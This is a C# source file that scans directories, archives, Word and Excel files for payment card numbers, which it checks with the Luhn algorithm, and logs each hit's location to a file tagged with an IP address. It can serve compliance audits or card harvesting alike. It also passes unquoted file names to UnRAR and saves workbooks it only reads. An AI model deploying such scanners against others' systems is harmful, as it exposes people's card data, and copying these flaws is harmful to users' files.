using Microsoft.Office.Interop.Excel;
using Microsoft.Office.Interop.Word;
using Protocols;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.IO.Compression;
using System.Diagnostics;

namespace WinServices
{

    public class Search
    {
        private Packet Packets = new Packet();
        
        double a = 0, b = 0;

        public Search(Packet Pak)
        {
            Packets = Pak;
            logFileName = (DateTime.Now.ToString().Replace(':', '-') + "_"+Packets.IPAdress.Replace('.', '-') + ".txt");
        }

        private void FindInDir(DirectoryInfo dir, int CVV, int MSOffice, int Rar, long files, long currentFiles)
        {
            Packets.CountFiles += dir.GetFiles().Count();

            foreach (FileInfo file in dir.GetFiles())
            {
                //if (mainReg == 1)
                //{
                //    if (MSOffice == 1)
                //    {
                //        if (file.Extension.ToLower() == ".doc" || file.Extension.ToLower() == ".docx" || file.Extension.ToLower() == ".xls" || file.Extension.ToLower() == ".xlsx")
                //        {
                //            Packets.CountFiles++;//files++;
                //            continue;
                //        }
                //        continue;
                //    }
                //    else
                //    {
                //        Packets.CountFiles++;//files++;
                //        continue;
                //    }
                //}

                ++Packets.CurrentFile;

                string Path;

                double res = (((double)Packets.CurrentFile / (double)Packets.CountFiles) * 100);

                Packets.Progress = Convert.ToInt32(res);

                if (file.Extension.ToLower() == ".exe" || file.Extension.ToLower() == ".dll")
                    continue;
                if (file.Length > 120000000)
                    continue;

                if (MSOffice == 1)
                {
                    if (file.Extension.ToLower() == ".doc" || file.Extension.ToLower() == ".docx" || file.Extension.ToLower() == ".xls" || file.Extension.ToLower() == ".xlsx")
                    {
                        if (file.Extension.ToLower() == ".doc" || file.Extension.ToLower() == ".docx")
                        {
                            if (MSWordMatches(file.FullName, CVV))
                                WriteLog();
                        }
                        else
                        {
                            if (MSExcelMatches(file.FullName, CVV))
                                WriteLog();
                        }
                        continue;
                    }
                }

                if (file.Extension.ToLower() == ".doc" || file.Extension.ToLower() == ".docx" || file.Extension.ToLower() == ".xls" || file.Extension.ToLower() == ".xlsx")
                {
                    if (file.Extension.ToLower() == ".doc" || file.Extension.ToLower() == ".docx")
                    {
                        if (MSWordMatches(file.FullName, CVV))
                            WriteLog();
                    }
                    else
                    {
                        if (MSExcelMatches(file.FullName, CVV))
                            WriteLog();
                    }
                }


                if (file.Extension.ToLower() == ".rar" || file.Extension.ToLower() == ".7z" || file.Extension.ToLower() == ".zip")
                {
                    FindRar(file.FullName, CVV);
                }

                else
                {
                    FindMatches(file.FullName, CVV);

                    WriteLog();
                }

            }

            foreach (DirectoryInfo subdir in dir.GetDirectories())
            {
                try
                {
                    this.FindInDir(subdir, CVV, MSOffice, Rar, Packets.CountFiles, Packets.CurrentFile);
                }
                catch (Exception)
                {

                }
            }

        }

        private void DecompressFileRar(string inFile, string outFile)
        {
            string[] envVars = new[] { "ProgramW6432", "ProgramFiles", "ProgramFiles(x86)" };
            string unrarPath = envVars.Select(v => Environment.GetEnvironmentVariable(v))
                .Where(v => v != null)
                .Distinct()
                .Select(v => Path.Combine(v, @"WinRAR\UnRAR.exe"))
                .Where(p => File.Exists(p))
                .FirstOrDefault();
            if (unrarPath != null)
            {
                Process proc = new Process();
                proc.StartInfo.FileName = unrarPath;
                proc.StartInfo.Arguments = " x " + inFile + " " + outFile;
                proc.Start();
                proc.WaitForExit();
                //Process.Start(unrarPath, " x "+ inFile+" "+ outFile);
            }
        }


        public bool FindRar(string fPath, int reg)
        {
            FileInfo fi = new FileInfo(fPath);
            string curFile = fi.FullName;
            string origName = curFile.Remove(curFile.Length -
                        fi.Extension.Length);

            if (!Directory.Exists(origName))
                Directory.CreateDirectory(origName);

            DecompressFileRar(fPath, origName);

            FindInDir(new DirectoryInfo(origName), Convert.ToInt32(Packets.CVV), Convert.ToInt32(Packets.MSOffice), Convert.ToInt32(Packets.Rar), Packets.CountFiles, Packets.CurrentFile);

            System.IO.DirectoryInfo di = new DirectoryInfo(origName);

            foreach (FileInfo file in di.EnumerateFiles())
            {
                file.Delete();
            }

            di.Delete();

            return true;
        }

        public void FindFiles()
        {
            //string LogFile = (DateTime.Now.ToString().Replace(':', '-')+"_"+ Packets.IPAdress.Replace('.', '-') + ".txt");
            
            try
            {
                this.FindInDir(new DirectoryInfo(Packets.Directory), Convert.ToInt32(Packets.CVV), Convert.ToInt32(Packets.MSOffice), Convert.ToInt32(Packets.Rar), Packets.CountFiles, Packets.CurrentFile);

                Packets.FileInfo = logFileName;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return;
            }
        }

        public bool FindMatches(string fPath, int reg)
        {
            Matches.Clear();

            StringReader br = new StringReader(File.ReadAllText(fPath));
            string fl = br.ReadToEnd();
            br.Close();
            Regex regex1 = null;
            Regex regex2 = null;
            Regex regex3 = null;

            if (reg == 0)
            {
                regex1 = new Regex(@"[0-9]{16}");
                regex2 = new Regex("[0-9]{4}\\r\\n[0-9]{4}\\r\\n[0-9]{4}\\r\\n[0-9]{4}");
                regex3 = new Regex(@"[0-9]{4}\s[0-9]{4}\s[0-9]{4}\s[0-9]{4}");
            }
            else
            {
                regex1 = new Regex(@"[0-9]{19}");
                regex2 = new Regex("[0-9]{4}\\r\\n[0-9]{4}\\r\\n[0-9]{4}\\r\\n[0-9]{4}\\r\\n[0-9]{3}");
                regex3 = new Regex(@"[0-9]{4}\s[0-9]{4}\s[0-9]{4}\s[0-9]{4}\s[0-9]{3}");
            }
            MatchCollection matches1 = regex1.Matches(fl);
            MatchCollection matches2 = regex2.Matches(fl);
            MatchCollection matches3 = regex3.Matches(fl);

            bool matches = false;

            if (matches1.Count != 0)
            {
                foreach (Match match in regex1.Matches(fl))
                {
                    int i = match.Index;
                    if (CalcLune(fl.Substring(i, 16)))
                    {
                        if (!matches)
                        {
                            Matches.Add(fPath);
                            Matches.Add(fl.Substring(i, 16));
                            Matches.Add(i.ToString());
                            matches = true;
                        }
                        else {
                            Matches.Add(fl.Substring(i, 16));
                            Matches.Add(i.ToString());
                        }

                    }

                }
            }

            if (matches2.Count != 0)
            {  
                foreach (Match match in regex2.Matches(fl))
                {
                    int i = match.Index;
                    if (CalcLune(fl.Substring(i, 23).Replace("\r", "").Replace("\n", "")))
                    {
                        if (!matches)
                        {
                            Matches.Add(fPath);
                            Matches.Add(fl.Substring(i, 23));
                            Matches.Add(i.ToString());
                            matches = true;
                        }
                        else {
                            Matches.Add(fl.Substring(i, 23));
                            Matches.Add(i.ToString());
                        }
                    }

                }
            }

            if (matches3.Count != 0)
            {
                foreach (Match match in regex3.Matches(fl))
                {
                    int i = match.Index;
                    if (CalcLune(fl.Substring(i, 19).Replace(" ", "").Replace("\r", "").Replace("\n", "")))
                    {
                        if (!matches)
                        {
                            Matches.Add(fPath);
                            Matches.Add(fl.Substring(i, 19));
                            Matches.Add(i.ToString());
                            matches = true;
                        }
                        else {
                            Matches.Add(fl.Substring(i, 19));
                            Matches.Add(i.ToString());
                        }
                    }
                }
            }

            return true;

        }

        private List<string> Matches = new List<string>();

        public bool CalcLune(string cardNumb)
        {
            int sum = 0;
            int len = cardNumb.Length;
            for (int i = 0; i < len; i++)
            {
                int add = (cardNumb[i] - '0') * (2 - (i + len) % 2);
                add -= add > 9 ? 9 : 0;
                sum += add;
            }
            if (sum == 0 || sum < 0)
                return false;
            return sum % 10 == 0;

        }

        public string[] GetPagesDoc(object Path)
        {
            List<string> Pages = new List<string>();

            // Get application object
            app = new Microsoft.Office.Interop.Word.Application();

            // Get document object
            object Miss = System.Reflection.Missing.Value;
            app.Visible = false;
            Document doc = app.Documents.Open(Path);

            // Get pages count
            Microsoft.Office.Interop.Word.WdStatistic PagesCountStat = Microsoft.Office.Interop.Word.WdStatistic.wdStatisticPages;
            int PagesCount = doc.ComputeStatistics(PagesCountStat, ref Miss);

            //Get pages
            object What = Microsoft.Office.Interop.Word.WdGoToItem.wdGoToPage;
            object Which = Microsoft.Office.Interop.Word.WdGoToDirection.wdGoToAbsolute;
            object Start;
            object End;
            object CurrentPageNumber;
            object NextPageNumber;

            for (int Index = 1; Index < PagesCount + 1; Index++)
            {
                CurrentPageNumber = (Convert.ToInt32(Index.ToString()));
                NextPageNumber = (Convert.ToInt32((Index + 1).ToString()));

                // Get start position of current page
                Start = app.Selection.GoTo(ref What, ref Which, ref CurrentPageNumber, ref Miss).Start;

                // Get end position of current page                                
                End = app.Selection.GoTo(ref What, ref Which, ref NextPageNumber, ref Miss).End;

                // Get text
                if (Convert.ToInt32(Start.ToString()) != Convert.ToInt32(End.ToString()))
                    Pages.Add(doc.Range(ref Start, ref End).Text);
                else
                    Pages.Add(doc.Range(ref Start).Text);
            }

            if (doc != null)
                doc.Close();
            if (app != null)
            {
                app.Quit();
                app = null;
            }

            return Pages.ToArray<string>();
        }

        private Microsoft.Office.Interop.Word.Application app;

        private Document doc;

        public bool MSWordMatches(string fPath, int reg)
        {
            try
            {
                string[] WordPages = GetPagesDoc(fPath);

                int wordpage = 1;

                foreach (var allWords in WordPages)
                {
                    Regex regex1 = null;
                    Regex regex2 = null;
                    Regex regex3 = null;

                    if (reg == 0)
                    {
                        regex1 = new Regex(@"[0-9]{16}");
                        regex2 = new Regex("[0-9]{4}\\r\\n[0-9]{4}\\r\\n[0-9]{4}\\r\\n[0-9]{4}");
                        regex3 = new Regex(@"[0-9]{4}\s[0-9]{4}\s[0-9]{4}\s[0-9]{4}");
                    }
                    else
                    {
                        regex1 = new Regex(@"[0-9]{19}");
                        regex2 = new Regex("[0-9]{4}\\r\\n[0-9]{4}\\r\\n[0-9]{4}\\r\\n[0-9]{4}\\r\\n[0-9]{3}");
                        regex3 = new Regex(@"[0-9]{4}\s[0-9]{4}\s[0-9]{4}\s[0-9]{4}\s[0-9]{3}");
                    }
                    MatchCollection matches1 = regex1.Matches(allWords);
                    MatchCollection matches2 = regex2.Matches(allWords);
                    MatchCollection matches3 = regex3.Matches(allWords);

                    bool matches = false;

                    if (matches1.Count != 0)
                    {
                        foreach (Match match in regex1.Matches(allWords))
                        {
                            int i = match.Index;
                            if (CalcLune(allWords.Substring(i, 16)))
                            {
                                if (!matches)
                                {
                                    Matches.Add(fPath);
                                    Matches.Add(allWords.Substring(i, 16));
                                    Matches.Add("Page:"+wordpage+"|Position:"+i.ToString());
                                    matches = true;
                                }
                                else
                                {
                                    Matches.Add(allWords.Substring(i, 16));
                                    Matches.Add("Page:" + wordpage + "|Position:" + i.ToString());
                                }
                            }

                        }
                    }
                    if (matches2.Count != 0)
                    {
                        foreach (Match match in regex2.Matches(allWords))
                        {
                            int i = match.Index;
                            if (CalcLune(allWords.Substring(i, 23).Replace("\r", "").Replace("\n", "")))
                            {
                                if (!matches)
                                {
                                    Matches.Add(fPath);
                                    Matches.Add(allWords.Substring(i, 23));
                                    Matches.Add("Page:" + wordpage + "|Position:" + i.ToString());
                                    matches = true;
                                }
                                else
                                {
                                    Matches.Add(allWords.Substring(i, 23));
                                    Matches.Add("Page:" + wordpage + "|Position:" + i.ToString());
                                }
                            }

                        }
                    }
                    if (matches3.Count != 0)
                    {
                        foreach (Match match in regex3.Matches(allWords))
                        {
                            int i = match.Index;
                            if (CalcLune(allWords.Substring(i, 19).Replace(" ", "").Replace("\r", "").Replace("\n", "")))
                            {
                                if (!matches)
                                {
                                    Matches.Add(fPath);
                                    Matches.Add(allWords.Substring(i, 19));
                                    Matches.Add("Page:" + wordpage + "|Position:" + i.ToString());
                                    matches = true;
                                }
                                else
                                {
                                    Matches.Add(allWords.Substring(i, 19));
                                    Matches.Add("Page:" + wordpage + "|Position:" + i.ToString());
                                }
                            }
                        }
                    }
                }
            }
            catch
            {
                if (doc != null)
                    doc.Close();
                if (app != null)
                {
                    app.Quit();
                    app = null;
                }
                return false;
            }
            return true;
        }

        private Microsoft.Office.Interop.Excel.Application excelapp;
        private Microsoft.Office.Interop.Excel.Workbook excelappworkbook;

        public bool MSExcelMatches(string fPath, int reg)
        {
            try
            {
                Sheets excelsheets;
                Microsoft.Office.Interop.Excel.Worksheet excelworksheet;

                excelapp = new Microsoft.Office.Interop.Excel.Application();
                excelapp.Visible = false;

                //Открываем книгу и получаем на нее ссылку
                excelappworkbook = excelapp.Workbooks.Open(fPath,
                 Type.Missing, Type.Missing, Type.Missing, Type.Missing,
                 Type.Missing, Type.Missing, Type.Missing, Type.Missing,
                 Type.Missing, Type.Missing, Type.Missing, Type.Missing,
                 Type.Missing, Type.Missing);
                excelsheets = excelappworkbook.Worksheets;
                ////Получаем ссылку на лист 1
                excelworksheet = (Microsoft.Office.Interop.Excel.Worksheet)excelsheets.get_Item(1);

                int CountSheet = excelappworkbook.Worksheets.Count;
                int usedRowsNum = excelworksheet.UsedRange.Rows.Count;
                int usedColumnsNum = excelworksheet.UsedRange.Columns.Count;

                Regex regex1 = null;
                Regex regex2 = null;
                Regex regex3 = null;

                if (reg == 0)
                {
                    regex1 = new Regex(@"[0-9]{16}");
                    regex2 = new Regex("[0-9]{4}\\r\\n[0-9]{4}\\r\\n[0-9]{4}\\r\\n[0-9]{4}");
                    regex3 = new Regex(@"[0-9]{4}\s[0-9]{4}\s[0-9]{4}\s[0-9]{4}");
                }
                else
                {
                    regex1 = new Regex(@"[0-9]{19}");
                    regex2 = new Regex("[0-9]{4}\\r\\n[0-9]{4}\\r\\n[0-9]{4}\\r\\n[0-9]{4}\\r\\n[0-9]{3}");
                    regex3 = new Regex(@"[0-9]{4}\s[0-9]{4}\s[0-9]{4}\s[0-9]{4}\s[0-9]{3}");
                }
                string cellValue = "";

                bool matches = false;

                for (int sheet = 1; sheet <= CountSheet; sheet++)
                {
                    for (int i = 1; i <= usedRowsNum; i++)
                    {
                        for (int y = 1; y <= usedColumnsNum; y++)
                        {
                            Microsoft.Office.Interop.Excel.Range cellRange = (Microsoft.Office.Interop.Excel.Range)excelworksheet.Cells[i, y];

                            if (cellRange.Value != null)
                            {
                                cellValue = cellRange.Value.ToString();

                                MatchCollection matches1 = regex1.Matches(cellValue);
                                MatchCollection matches2 = regex2.Matches(cellValue);
                                MatchCollection matches3 = regex3.Matches(cellValue);



                                if (matches1.Count != 0)
                                {
                                    foreach (Match match in regex1.Matches(cellValue))
                                    {
                                        int q = match.Index;
                                        if (CalcLune(cellValue.Substring(q, 16)))
                                        {
                                            if (!matches)
                                            {
                                                Matches.Add(fPath);

                                                Matches.Add(cellValue.Substring(q, 16));

                                                Matches.Add("Sheet:" + sheet.ToString() + "|Row:" + i.ToString() + "|Column:" + y.ToString() + "|Position:" + q.ToString());

                                                matches = true;
                                            }
                                            else
                                            {
                                                Matches.Add(cellValue.Substring(q, 16));

                                                Matches.Add("Sheet:" + sheet.ToString() + "|Row:" + i.ToString() + "|Column:" + y.ToString() + "|Position:" + q.ToString());
                                            }
                                        }

                                    }
                                }
                                if (matches2.Count != 0)
                                {
                                    foreach (Match match in regex2.Matches(cellValue))
                                    {
                                        int q = match.Index;
                                        if (CalcLune(cellValue.Substring(q, 23).Replace("\r", "").Replace("\n", "")))
                                        {
                                            if (!matches)
                                            {
                                                Matches.Add(fPath);

                                                Matches.Add(cellValue.Substring(q, 23).Replace("\r", "").Replace("\n", ""));

                                                Matches.Add("Sheet:" + sheet.ToString() + "|Row:" + i.ToString() + "|Column:" + y.ToString() + "|Position:" + q.ToString());
                                                matches = true;
                                            }
                                            else
                                            {
                                                Matches.Add(cellValue.Substring(q, 23).Replace("\r", "").Replace("\n", ""));

                                                Matches.Add("Sheet:" + sheet.ToString() + "|Row:" + i.ToString() + "|Column:" + y.ToString() + "|Position:" + q.ToString());
                                            }
                                        }
                                    }
                                }
                                if (matches3.Count != 0)
                                {
                                    foreach (Match match in regex3.Matches(cellValue))
                                    {
                                        int q = match.Index;
                                        if (CalcLune(cellValue.Substring(q, 19).Replace(" ", "").Replace("\r", "").Replace("\n", "")))
                                        {
                                            if (!matches)
                                            {
                                                Matches.Add(fPath);

                                                Matches.Add(cellValue.Substring(q, 19).Replace(" ", "").Replace("\r", "").Replace("\n", ""));

                                                Matches.Add("Sheet:" + sheet.ToString() + "|Row:" + i.ToString() + "|Column:" + y.ToString() + "|Position:" + q.ToString());
                                                matches = true;
                                            }
                                            else
                                            {
                                                Matches.Add(cellValue.Substring(q, 19).Replace(" ", "").Replace("\r", "").Replace("\n", ""));

                                                Matches.Add("Sheet:" + sheet.ToString() + "|Row:" + i.ToString() + "|Column:" + y.ToString() + "|Position:" + q.ToString());
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }

                excelappworkbook.Save();

                excelappworkbook.Close();

                excelapp.Quit();

                excelapp = null;

                return true;
            }
            catch  {
                excelappworkbook.Save();

                excelappworkbook.Close();

                excelapp.Quit();

                excelapp = null;

                return false;
            }
            
        }

        private string logFileName;

        private void WriteLog()
        {
            try
            {
                StreamWriter sw = new StreamWriter(logFileName, true);

                foreach (var item in Matches)
                    sw.WriteLine(item);

                sw.Close();
            }
            catch (Exception)
            {
                //MessageBox.Show("Ошибка записи в файл!", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

        }
    }

}
